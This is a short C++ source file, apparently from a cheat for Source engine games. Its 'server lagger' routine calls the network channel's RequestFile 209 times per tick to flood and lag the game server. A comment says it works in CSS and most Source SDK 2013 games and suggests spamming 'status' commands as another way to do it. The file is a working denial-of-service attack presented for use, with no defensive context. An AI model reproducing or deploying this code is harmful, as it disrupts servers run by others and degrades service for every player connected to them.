#include "Misc.h"

void C_Misc::Run(C_UserCmd* pCmd)
{
	if (auto pLocal = gInts.EntityList->GetClientEntity(gInts.Engine->GetLocalPlayer()))
	{
		if (bServerLagger)
		{
			if (auto NetChannel = gInts.Engine->GetNetChannelInfo())
				for (int i = 1; i < 210; i++)
					NetChannel->RequestFile(NULL, (unsigned int)".txt"); // This works in CSS and most other SSDK2013 games but I haven't rlly tested it in gmod, alternatively you can spam status with servercmd
		}
	}
}